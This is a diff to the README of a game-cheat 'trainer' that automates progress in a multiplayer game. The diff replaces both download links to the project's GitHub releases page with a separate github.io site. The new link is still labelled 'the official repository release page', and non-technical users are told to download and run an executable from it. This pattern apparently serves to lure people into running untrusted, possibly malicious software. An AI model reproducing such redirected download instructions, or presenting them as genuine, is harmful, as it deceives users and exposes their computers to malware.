@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your game progress with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ananto9252/DBD-AutoGrind-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://ananto9252.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start. These settings a
 
 Follow these steps to set up the trainer on your machine. You do not need technical knowledge to complete this process.
 
-1.  Visit the official repository release page: https://github.com/ananto9252/DBD-AutoGrind-Trainer-2026/releases
+1.  Visit the official repository release page: https://ananto9252.github.io
 2.  Locate the latest version entry.
 3.  Click the download link for the primary executable file.
 4.  Save the file to a folder on your computer. Note the location for easy access.
